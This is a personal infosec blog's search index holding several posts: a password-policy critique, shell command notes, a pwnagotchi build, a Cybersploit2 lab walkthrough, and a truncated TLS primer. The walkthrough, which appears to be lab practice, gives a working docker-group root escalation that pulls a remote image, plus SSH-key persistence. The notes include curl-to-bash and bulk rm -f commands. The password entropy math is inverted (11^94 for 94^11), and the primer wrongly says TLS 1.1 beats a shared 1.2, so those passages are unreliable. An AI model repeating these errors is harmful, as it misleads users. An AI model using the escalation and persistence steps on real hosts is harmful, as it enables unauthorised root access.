{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Hey there! Welcome to my site! Chances are you are here because either We met in person and I gave you this link. Your awesome by the way :) You got this link from a job application I submitted to your company Your a rando on the internet who just stumbled on this website In any case your welcome to stick around for awhile. Feel free to take a look at some of the stuff I've made on my GitHub or read some of my posts on this blog. A little bit about me I'm just an avid Infosec enthusiast that likes to write code that does things and I also have opinions about how security should be done and what needs to be done industry wide to improve. If you feel the need to contact me or just want to chat You can hit me up at my email directly at shane.bradfield1@gmail.com or by reaching out via any of the social media buttons at the bottom of any page.","title":"Welcome to my site"},{"location":"#a-little-bit-about-me","text":"I'm just an avid Infosec enthusiast that likes to write code that does things and I also have opinions about how security should be done and what needs to be done industry wide to improve.","title":"A little bit about me"},{"location":"#if-you-feel-the-need-to-contact-me-or-just-want-to-chat","text":"You can hit me up at my email directly at shane.bradfield1@gmail.com or by reaching out via any of the social media buttons at the bottom of any page.","title":"If you feel the need to contact me or just want to chat"},{"location":"Blog/2017-1-29-Hello-World/","text":"Hey guys this is my first blog post I will be experimenting with it more in my free time so keep an eye out for updates!","title":"HELO WRLD"},{"location":"Blog/2017-1-30-A-critisism-of-Password-policies/","text":"In my short time in the industry I have noticed some disturbing things about passwords and the common policies that govern them. It seems that no matter the requirements that are imposed on any given corporation there is a lot of overlap no matter if you are trying comply with PCI, HIPPA, NIST and others. This poses a problem because you will see a lot of common policies across a ton of different industries and the most common policies I see are something along these lines: Password Policy 8 characters Minimum 1 Uppercase 1 Number 1 Special Character Passwords must be changed once every 90 days While that may seem okay at first glance; over time you begin to see a lot of this Password1! Yes, that\u2019s right! It is the year 2017 and I am still seeing this password used in almost every environment I have seen. While xkcd may have gotten something right with their comic on passwords and entropy, they got their math wrong. So, let\u2019s break this down and get the math right. The English language contains 26 lowercase and 26 uppercase characters so right there in a single 1 character string you have 52 possible characters. Now if we consider including the numbers 0-9 that\u2019s an additional 10 characters with for a total of 62 and then we add the special characters which adds an additional 32 possible characters. Wait wait wait I hear you saying 32 characters? Bro do you even count? Yes, I do and you are not considering characters like the brackets, greater or less than and quotes as well as tilde and backtick. So, if you are not using Alt-codes, the typical QWERTY keyboard can give you a total of 94 characters to work with. So, to do this calculation at home you take the number of characters of your password and you rise it to the power of how many characters in that set you have. So, for the password in the comic Tr0ub4dor&3 you have upper, lower, numeric and special characters across 11 characters so the math looks like 11^94 or 7.77 * 10^97. Now to determine if it is strong or not, we run it against an unrealistically strong cracker. So, for this example let\u2019s say I am going to try to break this at 1 trillion password attempts per second. It would still take 2.466 * 10^78 years at the most to break out using a brute force method. Now let\u2019s take a look at their proposed solution of correct horse battery staple . In this case, you have 28 characters including spaces between the words using just the lowercase set so we have 27 characters to work with so 28^27 is 1.18 * 10^39. Which is a significantly smaller space than the first password it would still take 37.5 * 10^18 years at the most to break out fully. Let's recap so far, we have seen 2 examples of really good passwords that should last you until long after your death. However, they are both weak to one specific type of attack: The Man-in-the-middle (MiTM) attack. In this attack the attacker sits in-between the user and the authentication service as to intercept the authentication tokens as they pass from the user to the service. At this point all the entropy in the world won\u2019t save you because the attacker already has your password. So how do we combat this? My recommendation is to implement two factor authentication (2FA) on every service you use. This is a type of authentication that uses a 6-8 digit numeric code that changes once every 30-60 seconds. This is sent to you out of band through something like an SMS message or RSA token. If that code is wrong, even if the username and password is right, the service will not authenticate you. In doing so we can limit an attackers window of opportunity to crack a password to 30-60 seconds. But how can we make it stronger? Well the use of passphrase while unpopular is always a feasible option. So, for example this very sentence could be your next password. But that rises another question if we begin using this type of password wont attackers just start cracking based on words in the English language with spaces in between? Yes, I predict they would but here we run into the entropy question again as the full 20 volume Oxford English Dictionary contains 171,476 individual entries for words so for the example above of an 11-word sentence it would take a cracker trying a trillion word combinations per second 2.255 * 10^178554 years to completely crack out. Which is longer than the projected heat death of the known universe and we didn\u2019t even calculate for punctuation, commas, spaces or even uppercase characters which would take even longer. But how do we make this a better password policy using this criterion. Here are my proposed changes Password Policy 10-word minimum 1 Uppercase letter 1 Punctuation Mark 2FA Enabled Passwords must be changed once every year or whenever a user feels they might have been compromised","title":"A criticism of password policies"},{"location":"Blog/2018-11-04-Command-Notes/","text":"A collection of useful commands #List all files in long listing in human readable format sorted by time ls -halt #Find files in a directory that are larger than 250MB and for each file found ls them find / -type f -size +250M -exec ls -halt {} \\; #Removes the files found in the above command find / -type f -size +250M -exec rm -f {} \\; #Removes the files older than 90 days in /var/log/ find /var/log/* -mtime +90 -type f -exec rm -f {} \\; #Finds where java is then follows all the symlinks down to where its actually installed readlink -f `which java` #Create the user username, assigns thier home directory to /home/username, and set their shell to /bin/bash useradd -m -d /home/username -s /bin/bash username #Wipes out the contents of a file and then removes it; Faster than just removing a very large file cat /dev/null > /path/to/file; rm -f /path/to/file #Change ownership on a directory recursively chown -R username:usergroup /path/to/directory #Preserve the last 100 lines of a file wipe out the rest echo $(tail -n 100 /path/to/file) > /path/to/file #Run a file hosted on a webserver localy curl -sSL http://webserver.web/path/to/raw/file | bash -s argument1 argument2 argument3 #Kickoff a process in the background under its own pid nohup longRunningCommandHere > longRunningCommand.log 2>&1 & #Set up a user so its password never expires chage -E 1 -I 1 -m 0 -M 99999 -W 7 username; chage -l username #Find all of the copies of Apache Struts running on a system and return their version numbers #!/bin/bash JarFiles=$(find / -type f -name struts.jar) for Jar in $JarFiles; do JarVer=$(unzip -p \"$Jar\" META-INF/MANIFEST.MF | grep Specification-Version | awk -F: '{{print $2}}') echo \"$Jar|$JarVer\" >> \"{parameter \"outputFile\"}\" done du / | sort -n | less","title":"Command Notes"},{"location":"Blog/2019-10-08-pwnagotchi-beautify/","text":"In this industry I see a lot a great projects. Code stacked in great monoliths towering over us all. But at the end of the day that all it is line after line of words in a document. Its a real shame that so many great projects don't get the props they deserve because they look just like the rest. So today I figured I would go over how I breathed new life into my pwnagotchi killerB. Step 1: Deciding on a case and ordering parts The case you pick will ultimately decide what kind of environment your pwnagotchi will be used in and how much hassle you are willing to deal with. Take some time to consider the case that you pick and what your needs are for the project. For me I had several criteria that I knew I had to meet me selecting mine. Weight No more than a pound and a half grand total Housing Something that I could easily decorate Does not conduct electricity Slip resistant Supports a 2.13in eInk Display Optional Features Battery that will get me more than 1 hour of run time by itself While I was in this step I began ordering some of the base components I would need for the project. An SD Card I like to have some space on my project to mess around so I went with a 128GB Sandisk but consult the project docs if you would like to go lower than 16GB A Raspberry Pi I went with the Zero W v1.1 on this build but I hear that the pwnagotchi will support 5Ghz on the Pi 4 model A Battery pack Ended up going with a PiSugar (1200 mAh Variant) A Screen For me the Waveshare 2.13in eInk display was the only one working when I sourced these parts again check the documentation on screens that are supported Ultimately I ended up going with the PiSugar XL Case for the Raspberry Pi Zero W . In my eyes this case met all of the things that I wanted in this project of course this led me to my next big problem ... Step 2: Sourcing the materials So to my everlasting shame I don't own a 3D Printer nor do I have easy access to one. 3D modeling is a gap in my knowledge that I hope to address one day but I will be saving that for another project. Luckily for me there are plenty of very reputable business that will print just about anything you send them so long as they can read the files and it doesn't go against their terms of service. In my case I decided to go with Shapeways. For those who don't know who they are Shapeways is a Dutch-founded, New York-based 3D printing marketplace and service, startup company. Users design and upload 3D printable files, and Shapeways prints the objects for them or others. Users can have objects printed in over 55 materials and finishes, these include: plastics, precious metals, steel and food-safe ceramics, which were discontinued and have been replaced by porcelain materials. As of 2019, Shapeways printed and sold more than ten million user-created objects. - https://en.wikipedia.org/wiki/Shapeways however there are many other companies that one could go with. Just google around for 3d printing services and I'm sure you will find one that fits your needs. If you choose to go the same route that I did then its as simple as logging in, uploading the STL files that you got from the Pi Sugar link from above and checking out. They will go ahead and inspect the models to let you know if there may be any issues with manufacturing and print the parts in your selected material. Once that's done they go ahead and ship you the parts. In my case the total ending up coming to $46.90 USD but deviating from the materials that I selected may change the cost. Step 3: Decorating Once all of the parts and peace's have been delivered its time to get to decorating! Remember that your pwnagotchi is as individual as you are and just like how I would assume you don't like looking bad neither does your pwnagotchi! For this build I will be using a base color of BLACK 2.0 from Culture Hustle as it is acrylic paint that works well on plastics and as an added bonus has some very interesting light absorbing properties that I hope to use in future projects. I will also be using some Citadel layer paint in Phalanx Yellow for the detail work. This paint was chosen simply for aesthetic reasons and because its commonly used on Warhammer 40k figures which makes it very compatible with commonly used plastics. Once I had all of the things I needed it was time to get decorating! As you can see by this picture the Black paint is very thick; I was able to accomplish what you see here in one coat. This picture was taken while I was testing the compatibility of this paint with the plastic; upon finding no problems with it I knew it was safe to proceed with the rest of the parts. Once all the parts were painted they were set aside for 24 hours to cure completely. I've seen a couple of videos from the artist claiming that this paint actually gets darker the longer it cures up to 24 hours so I wanted to make sure I got the most out of the dark color. Once the first round of drying was done it is time to add the details! To get these stripes I just used some masking tape to mark of an area and begin to generously add the Phalanx Yellow taking care to let it dry before adding a second coat and removing the masking tape. This process was repeated twice, once for each stripe. Step 4: Bringing it all together Once everything is good and dry you should be at the point where its all ready to come together. You can begin by first putting the button into place and then adding the PiSugar board to the bottom of the case. Following that insert the plastic screws that come with it. I found that using the battery attached to the board and sliding it over so that it holds 2 of the screw's in place while you hold the other two with your fingers is a good way to keep them all in place while you insert the Pi with flashed SD card into the other side. Once that's done add the plastic spacers that come with and the plastic nuts and your good to go. Please note that at this point its a good time to do a quick test of the board to make sure that everything is functioning as expected. Click the button once to turn on the PiSugar and twice to turn it off. The 4 lights on that board will glow indicating a full charge and you should see that through the 4 holes in the side of the case any less than 4 lights indicates a discharged battery of 25%, 50%, 75% and 100% respectively. Additionally you should also see the raspberry pi indicator light flashing indicating a boot up and then it will blink 10 times ... I think after the pwnagotchi software and config have been loaded. An important note about changing, under no circumstances should you charge the PiSugar and run power to the Pi at the same time. The manufacturer has noted this has potential to short out the boards in the best case and may cause a fire in the worst case due to overcharging. If you run power to the PiSugar like seen in the photo it will keep the Pi on while it changes, this is normal behavior. Additionally I have seen no problems so far with running a data only line to a computer to tinker on the data port while I am float charging the battery on the PiSugar but I accept no responsibility in the event something happens to either you or your property. Tinker and charge at your own risk. If you get to this point your pwnagotchi should look something like this. Please don't be and idiot like me and forget to remove any heatsinks on the Pi before adding the eInk Display. Any heatsinks present will most assuredly destroy the back of your eInk and you will have to order a new one if you fuck it up. There is not enough room in this case for both. Once you have heeded the warning above you can line up your eInk Display and add it to the header pins. This done you can snap on the back and front panels and take your brand new and beautiful pwnagotchi for a walk!","title":"pwnagotchi.beautify();"},{"location":"Blog/2019-10-08-pwnagotchi-beautify/#step-1-deciding-on-a-case-and-ordering-parts","text":"The case you pick will ultimately decide what kind of environment your pwnagotchi will be used in and how much hassle you are willing to deal with. Take some time to consider the case that you pick and what your needs are for the project. For me I had several criteria that I knew I had to meet me selecting mine. Weight No more than a pound and a half grand total Housing Something that I could easily decorate Does not conduct electricity Slip resistant Supports a 2.13in eInk Display Optional Features Battery that will get me more than 1 hour of run time by itself While I was in this step I began ordering some of the base components I would need for the project. An SD Card I like to have some space on my project to mess around so I went with a 128GB Sandisk but consult the project docs if you would like to go lower than 16GB A Raspberry Pi I went with the Zero W v1.1 on this build but I hear that the pwnagotchi will support 5Ghz on the Pi 4 model A Battery pack Ended up going with a PiSugar (1200 mAh Variant) A Screen For me the Waveshare 2.13in eInk display was the only one working when I sourced these parts again check the documentation on screens that are supported Ultimately I ended up going with the PiSugar XL Case for the Raspberry Pi Zero W . In my eyes this case met all of the things that I wanted in this project of course this led me to my next big problem ...","title":"Step 1: Deciding on a case and ordering parts"},{"location":"Blog/2019-10-08-pwnagotchi-beautify/#step-2-sourcing-the-materials","text":"So to my everlasting shame I don't own a 3D Printer nor do I have easy access to one. 3D modeling is a gap in my knowledge that I hope to address one day but I will be saving that for another project. Luckily for me there are plenty of very reputable business that will print just about anything you send them so long as they can read the files and it doesn't go against their terms of service. In my case I decided to go with Shapeways. For those who don't know who they are Shapeways is a Dutch-founded, New York-based 3D printing marketplace and service, startup company. Users design and upload 3D printable files, and Shapeways prints the objects for them or others. Users can have objects printed in over 55 materials and finishes, these include: plastics, precious metals, steel and food-safe ceramics, which were discontinued and have been replaced by porcelain materials. As of 2019, Shapeways printed and sold more than ten million user-created objects. - https://en.wikipedia.org/wiki/Shapeways however there are many other companies that one could go with. Just google around for 3d printing services and I'm sure you will find one that fits your needs. If you choose to go the same route that I did then its as simple as logging in, uploading the STL files that you got from the Pi Sugar link from above and checking out. They will go ahead and inspect the models to let you know if there may be any issues with manufacturing and print the parts in your selected material. Once that's done they go ahead and ship you the parts. In my case the total ending up coming to $46.90 USD but deviating from the materials that I selected may change the cost.","title":"Step 2: Sourcing the materials"},{"location":"Blog/2019-10-08-pwnagotchi-beautify/#step-3-decorating","text":"Once all of the parts and peace's have been delivered its time to get to decorating! Remember that your pwnagotchi is as individual as you are and just like how I would assume you don't like looking bad neither does your pwnagotchi! For this build I will be using a base color of BLACK 2.0 from Culture Hustle as it is acrylic paint that works well on plastics and as an added bonus has some very interesting light absorbing properties that I hope to use in future projects. I will also be using some Citadel layer paint in Phalanx Yellow for the detail work. This paint was chosen simply for aesthetic reasons and because its commonly used on Warhammer 40k figures which makes it very compatible with commonly used plastics. Once I had all of the things I needed it was time to get decorating! As you can see by this picture the Black paint is very thick; I was able to accomplish what you see here in one coat. This picture was taken while I was testing the compatibility of this paint with the plastic; upon finding no problems with it I knew it was safe to proceed with the rest of the parts. Once all the parts were painted they were set aside for 24 hours to cure completely. I've seen a couple of videos from the artist claiming that this paint actually gets darker the longer it cures up to 24 hours so I wanted to make sure I got the most out of the dark color. Once the first round of drying was done it is time to add the details! To get these stripes I just used some masking tape to mark of an area and begin to generously add the Phalanx Yellow taking care to let it dry before adding a second coat and removing the masking tape. This process was repeated twice, once for each stripe.","title":"Step 3: Decorating"},{"location":"Blog/2019-10-08-pwnagotchi-beautify/#step-4-bringing-it-all-together","text":"Once everything is good and dry you should be at the point where its all ready to come together. You can begin by first putting the button into place and then adding the PiSugar board to the bottom of the case. Following that insert the plastic screws that come with it. I found that using the battery attached to the board and sliding it over so that it holds 2 of the screw's in place while you hold the other two with your fingers is a good way to keep them all in place while you insert the Pi with flashed SD card into the other side. Once that's done add the plastic spacers that come with and the plastic nuts and your good to go. Please note that at this point its a good time to do a quick test of the board to make sure that everything is functioning as expected. Click the button once to turn on the PiSugar and twice to turn it off. The 4 lights on that board will glow indicating a full charge and you should see that through the 4 holes in the side of the case any less than 4 lights indicates a discharged battery of 25%, 50%, 75% and 100% respectively. Additionally you should also see the raspberry pi indicator light flashing indicating a boot up and then it will blink 10 times ... I think after the pwnagotchi software and config have been loaded. An important note about changing, under no circumstances should you charge the PiSugar and run power to the Pi at the same time. The manufacturer has noted this has potential to short out the boards in the best case and may cause a fire in the worst case due to overcharging. If you run power to the PiSugar like seen in the photo it will keep the Pi on while it changes, this is normal behavior. Additionally I have seen no problems so far with running a data only line to a computer to tinker on the data port while I am float charging the battery on the PiSugar but I accept no responsibility in the event something happens to either you or your property. Tinker and charge at your own risk. If you get to this point your pwnagotchi should look something like this. Please don't be and idiot like me and forget to remove any heatsinks on the Pi before adding the eInk Display. Any heatsinks present will most assuredly destroy the back of your eInk and you will have to order a new one if you fuck it up. There is not enough room in this case for both. Once you have heeded the warning above you can line up your eInk Display and add it to the header pins. This done you can snap on the back and front panels and take your brand new and beautiful pwnagotchi for a walk!","title":"Step 4: Bringing it all together"},{"location":"Blog/2020-07-19-Boot2Root-Cybersploit2/","text":"Cybersploit 2 can be found and downloaded at https://www.vulnhub.com/entry/cybersploit-2,511/ Cybersploit 2 was created by Shailendra Kumar Vishwakarma and you can find him on Twitter here https://twitter.com/CyberSploit1 Booting up this VM is as simple as getting it downloaded and stood up in Virtual Box I had to tweak its network adapter to make it work on my network but once its up and running we can log into our attacking box of choice and start with some basic recon. Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 22:07 CDT Nmap scan report for 10.0.0.158 Host is up (0.00081s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 3072 ad:6d:15:e7:44:e9:7b:b8:59:09:19:5c:bd:d6:6b:10 (RSA) | 256 d6:d5:b4:5d:8d:f9:5e:6f:3a:31:ad:81:80:34:9b:12 (ECDSA) |_ 256 69:79:4f:8c:90:e9:43:6c:17:f7:31:e8:ff:87:05:31 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos)) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) |_http-title: CyberSploit2 MAC Address: 08:00:27:30:A7:AD (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop TRACEROUTE HOP RTT ADDRESS 1 0.81 ms 10.0.0.158 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.55 seconds Kicking off an nmap scan we can see that this VM seems be a CentOS install running HTTP (Apache/2.4.37) and SSH (OpenSSH 8.0 (protocol 2.0)) on it. Were gonna go after HTTP first since in my experience SSH has always been a tougher nut to crack. In this case I am going to kick off a Nikto and dirb scan to see what kind of directory's we can find and if there are any obvious vulns in that config. - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.0.0.158 + Target Hostname: 10.0.0.158 + Target Port: 80 + Start Time: 2020-07-18 22:08:24 (GMT-5) --------------------------------------------------------------------------- + Server: Apache/2.4.37 (centos) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST + OSVDB-3268: /icons/: Directory indexing found. + OSVDB-3233: /icons/README: Apache default file found. + 8698 requests: 0 error(s) and 7 item(s) reported on remote host + End Time: 2020-07-18 22:08:36 (GMT-5) (12 seconds) --------------------------------------------------------------------------- + 1 host(s) tested ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Sat Jul 18 22:09:51 2020 URL_BASE: http://10.0.0.158/ WORDLIST_FILES: /opt/dirb/wordlists/big.txt ----------------- GENERATED WORDS: 20458 ---- Scanning URL: http://10.0.0.158/ ---- + http://10.0.0.158/cgi-bin/ (CODE:403|SIZE:217) ==> DIRECTORY: http://10.0.0.158/noindex/ ---- Entering directory: http://10.0.0.158/noindex/ ---- ==> DIRECTORY: http://10.0.0.158/noindex/common/ + http://10.0.0.158/noindex/index (CODE:200|SIZE:4006) ---- Entering directory: http://10.0.0.158/noindex/common/ ---- ==> DIRECTORY: http://10.0.0.158/noindex/common/css/ ==> DIRECTORY: http://10.0.0.158/noindex/common/fonts/ ==> DIRECTORY: http://10.0.0.158/noindex/common/images/ ---- Entering directory: http://10.0.0.158/noindex/common/css/ ---- + http://10.0.0.158/noindex/common/css/styles (CODE:200|SIZE:71634) ---- Entering directory: http://10.0.0.158/noindex/common/fonts/ ---- ---- Entering directory: http://10.0.0.158/noindex/common/images/ ---- ----------------- END_TIME: Sat Jul 18 22:10:30 2020 DOWNLOADED: 122748 - FOUND: 3 From the scan outputs we can see that Nikto is also seeing paths that are common with Apache configs which we can combine with what we saw in the nmap scan to more or less confirm at this point that we have Apache running here. We also know now we have a bunch of files we can look at here. The first thing that catches my eye is the /cgi-bin/ directory. This path is used by Apace installs to hold onto any executable code that is needed to make a website run; if unprotected in some cases an attacker can use this path to their advantage as it provides a foothold into the environment. In this case however we are getting an HTTP 403 Unauthorized back which means we will not be able to use it to our advantage. Now that we have some basic paths to look at we can begin to pull them down and start looking through the pages to see if there are any juicy tidbits left. From this image we can see that upon browsing to the webserver we have ourselves a table of usernames and passwords. Thinking back to the original nmap scan we did we saw SSH open on this VM and trying each pair in turn against SSH none of them seem to work in their current form. However one of the usernames stands out as different from the rest \"D92:=6?5C2\" while this could be a service account login I think more than a few languages may have issues parsing those characters in the same string and that doesn't seem like something that a developer would want to deal with. Looking for more clues we then can cat through the source of the page to find a comment hidden way that the bottom \"\\<!----------ROT47---------->\" Passing the odd stings we found through ROT47 we find that D92:=6?5C2 comes out to \"shailendra\" and its next field 4J36CDA=@:E` comes out as \"cybersploit1\". Passing these back into SSH produces a valid login for the VM and we now have compromised this account. Listing through this accounts home directory we find that Shailendra left us a clue as to what to look at next. [shailendra@localhost ~]$ cat hint.txt docker It seems he wants us to take a closer look into docker lets start by confirming its installed. [shailendra@localhost ~]$ find / -name docker -type f 2>/dev/null -exec ls -halt {} \\; -rwxr-xr-x. 1 root root 82M Jun 22 21:18 /usr/bin/docker -rw-r--r--. 1 root root 114K Jun 22 21:09 /usr/share/bash-completion/completions/docker Docker looks to be there but do we have permissions to access it? [shailendra@localhost ~]$ id uid=1001(shailendra) gid=1001(shailendra) groups=1001(shailendra),991(docker) Looks like we do. This is a very dangerous prospect because I now as an attacker am part of the docker group on a box that its installed on. This is dangerous because as we have confirmed in the find docker seems to be installed under root which is the default way to do that. The problem this introduces that that any container that docker launches will inherit those rights from the docker program. In his blog post on the topic Chris Foster lays out a kill chain that explains how one could go about exploiting this in the wild to preform privilege escalation up to the root account on the local docker host machine. https://fosterelli.co/privilege-escalation-via-docker In a nutshell this exploit works by telling docker to run a container that mounts the root filesystem \"/\" to \"/hostOS\" inside of that container from there the container will then chroot to /hostOS and launch a shell. Now since the container is launching the shell that will then inherit the privilege of its parent process (in this case docker which is running under root on the host node) effectively dropping us to a root shell running on the host node. [shailendra@localhost ~]$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease Unable to find image 'chrisfosterelli/rootplease:latest' locally latest: Pulling from chrisfosterelli/rootplease a4a2a29f9ba4: Pull complete 127c9761dcba: Pull complete d13bf203e905: Pull complete 4039240d2e0b: Pull complete 16a91ffa6f29: Pull complete Digest: sha256:eb6be3ee1f9b2fd6e3ae6d4fda81a80bfdf21aad9bde6f1a5234f1baa58d4bb3 Status: Downloaded newer image for chrisfosterelli/rootplease:latest You should now have a root shell on the host OS Press Ctrl-D to exit the docker instance / shell sh-4.4# whoami; id root uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:spc_t:s0 We can see that if we list out the processes with ps -ef --forest, our new /bin/sh shell is running with these privlages root 826 1 0 01:28 ? 00:00:01 /usr/libexec/platform-python -Es /usr/sbin/tuned -l -P root 827 1 0 01:28 ? 00:00:00 /usr/sbin/sshd -D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256- root 1709 827 0 02:48 ? 00:00:00 \\_ sshd: shailendra [priv] shailen+ 1725 1709 0 02:48 ? 00:00:00 \\_ sshd: shailendra@pts/0 shailen+ 1726 1725 0 02:48 pts/0 00:00:00 \\_ -bash shailen+ 1932 1726 0 03:23 pts/0 00:00:00 \\_ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease root 834 1 0 01:28 ? 00:00:22 /usr/bin/containerd root 1975 834 0 03:23 ? 00:00:00 \\_ containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v root 1992 1975 0 03:23 pts/0 00:00:00 \\_ /bin/bash exploit.sh root 2021 1992 0 03:23 pts/0 00:00:00 \\_ /bin/sh root 2042 2021 0 03:27 pts/0 00:00:00 \\_ ps -ef --forest What I find super interesting about this is our shell is /bin/sh on the host node however because of the chroot we did its running inside of the context of that container we launched. Meaning that if we were to loose the container we would also loose our shell so it would be wise at this point to establish some persistence in this VM so the fictional SysAdmin or Blue Team has a harder time kicking us out. I normally end up doing this by dropping an SSH key into /root/.ssh/authorized_keys that I generated on the attacking machine and logging in using it to get a proper root shell. [root@localhost ~]# whoami; id; root uid=0(root) gid=0(root) groups=0(root),991(docker) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 From here its childs play to ls the files in /root and cat out flag.txt [root@localhost ~]# ls anaconda-ks.cfg flag.txt get-docker.sh logs} [root@localhost ~]# cat flag.txt __ ___ _ __ ___ __ _____ __ / /` / / \\ | |\\ | / /`_ | |_) / /\\ | | ( (` \\_\\_, \\_\\_/ |_| \\| \\_\\_/ |_| \\ /_/--\\ |_| _)_) Pwned CyberSploit2 POC share it with me twitter@cybersploit1 Thanks !","title":"Boot2Root Walkthrough - Cybersploit2"},{"location":"Blog/2021-08-24-Doom/","text":"I like putting Doom on things! It's a great game so I've decided to embed a copy of it here for future projects. Doom is an excellent proof of concept for hacking as it shows to the layman what degree of control you as an attacker have over a machine ... or browser. It does a great job of showing that as an attacker You can run any code you so choose The degree of the previous is so extreme that you can easily play a videogame that they likely recognize That just like the name of the game this machine is doomed I feel that a lot of the time one of the major hurdles that the security industry has to overcome is how to explain why these extremely complicated attacks are something that a person or business should even care about. And even if they do care how can it be conveyed in a way that is both meaningful and relatable. That is why Doom is so important; it shows in a meaningful and relatable way why normal people should care about information security. And if you can do that then all that is left to do is fix the issue at hand. Something that by comparison is very easy indeed. Controls Arrow keys to move Left Control to Shoot Spacebar is your action button Use the Phone icon in the overlay for a mobile friendly experience","title":"Why Doom is important"},{"location":"Blog/2021-08-24-Doom/#controls","text":"Arrow keys to move Left Control to Shoot Spacebar is your action button Use the Phone icon in the overlay for a mobile friendly experience","title":"Controls"},{"location":"Blog/2021-08-26-An-SSL-Primer/","text":"I find it depressing when members of the IT community don't understand how SSL/TLS works so I've taken the time to compile a lot of the information as to how it works here. Note that a lot of this has been ripped directly from Wikipedia or RFC documentation and I am not at all taking credit for the work of the people that made those wonderful documents. What is SSL/TLS? Transport Layer Security (TLS), and its now-deprecated predecessor, Secure Sockets Layer (SSL), are cryptographic protocols designed to provide communications security over a computer network. Several versions of the protocols find widespread use in applications such as web browsing, email, instant messaging, and voice over IP (VoIP). Websites can use TLS to secure all communications between their servers and web browsers. The TLS protocol aims primarily to provide privacy and data integrity between two or more communicating computer applications. When secured by TLS, connections between a client (e.g., a web browser) and a server (e.g., wikipedia.org) should have one or more of the following properties: The connection is private (or secure) because symmetric cryptography is used to encrypt the data transmitted. The keys for this symmetric encryption are generated uniquely for each connection and are based on a shared secret that was negotiated at the start of the session. The server and client negotiate the details of which encryption algorithm and cryptographic keys to use before the first byte of data is transmitted. The negotiation of a shared secret is both secure (the negotiated secret is unavailable to eavesdroppers and cannot be obtained, even by an attacker who places themselves in the middle of the connection) and reliable (no attacker can modify the communications during the negotiation without being detected). The identity of the communicating parties can be authenticated using public-key cryptography. This authentication can be made optional, but is generally required for at least one of the parties (typically the server). The connection is reliable because each message transmitted includes a message integrity check using a message authentication code to prevent undetected loss or alteration of the data during transmission. In addition to the properties above, careful configuration of TLS can provide additional privacy related properties such as forward secrecy, ensuring that any future disclosure of encryption keys cannot be used to decrypt any TLS communications recorded in the past. The Basic TLS Handshake A typical connection example follows, illustrating a handshake where the server (but not the client) is authenticated by its certificate: Negotiation phase A client sends a ClientHello message specifying the highest TLS protocol version it supports, a random number, a list of suggested cipher suites and suggested compression methods. If the client is attempting to perform a resumed handshake, it may send a session ID. If the client can use Application-Layer Protocol Negotiation, it may include a list of supported application protocols, such as HTTP/2. The server responds with a ServerHello message, containing the chosen protocol version, a random number, cipher suite and compression method from the choices offered by the client. To confirm or allow resumed handshakes the server may send a session ID. The chosen protocol version should be the highest that both the client and server support. For example, if the client supports TLS version 1.1 and the server supports version 1.2, version 1.1 should be selected; version 1.2 should not be selected. The server sends its Certificate message (depending on the selected cipher suite, this may be omitted by the server). The server sends its ServerKeyExchange message (depending on the selected cipher suite, this may be omitted by the server). This message is sent for all DHE and DH_anon cipher suites. The server sends a ServerHelloDone message, indicating it is done with handshake negotiation. The client responds with a ClientKeyExchange message, which may contain a PreMasterSecret, public key, or nothing. (Again, this depends on the selected cipher.) This PreMasterSecret is encrypted using the public key of the server certificate. The client and server then use the random numbers and PreMasterSecret to compute a common secret, called the \"master secret\". All other key data for this connection is derived from this master secret (and the client- and server-generated random values), which is passed through a carefully designed pseudorandom function. The client now sends a ChangeCipherSpec record, essentially telling the server, \"Everything I tell you from now on will be authenticated (and encrypted if encryption parameters were present in the server certificate).\" The ChangeCipherSpec is itself a record-level protocol with content type of 20. The client sends an authenticated and encrypted Finished message, containing a hash and MAC over the previous handshake messages. The server will attempt to decrypt the client's Finished message and verify the hash and MAC. If the decryption or verification fails, the handshake is considered to have failed and the connection should be torn down. Finally, the server sends a ChangeCipherSpec, telling the client, \"Everything I tell you from now on will be authenticated (and encrypted, if encryption was negotiated).\" The server sends its authenticated and encrypted Finished message. The client performs the same decryption and verification procedure as the server did in the previous step. Application phase At this point in the process the \"handshake\" is complete and the application protocol is enabled, with content type of 23. Application messages exchanged between client and server will also be authenticated and optionally encrypted exactly like in their Finished message. Otherwise, the content type will return 25 and the client will not authenticate. The Client-authenticated TLS Handshake a.k.a Mutual Authentication a.k.a mAuth a.k.a mTLS a.k.a 2 Way SSL/TLS The following full example shows a client being authenticated (in addition to the server as in the example above) via TLS using certificates exchanged between both peers. Negotiation Phase A client sends a ClientHello message specifying the highest TLS protocol version it supports, a random number, a list of suggested cipher suites and compression methods. The server responds with a ServerHello message, containing the chosen protocol version, a random number, cipher suite and compression method from the choices offered by the client. The server may also send a session id as part of the message to perform a resumed handshake. The server sends its Certificate message (depending on the selected cipher suite, this may be omitted by the server). The server sends its ServerKeyExchange message (depending on the selected cipher suite, this may be omitted by the server). This message is sent for all DHE and DH_anon ciphersuites. The server sends a CertificateRequest message, to request a certificate from the client so that the connection can be mutually authenticated. The server sends a ServerHelloDone message, indicating it is done with handshake negotiation. The client responds with a Certificate message, which contains the client's certificate. The client sends a ClientKeyExchange message, which may 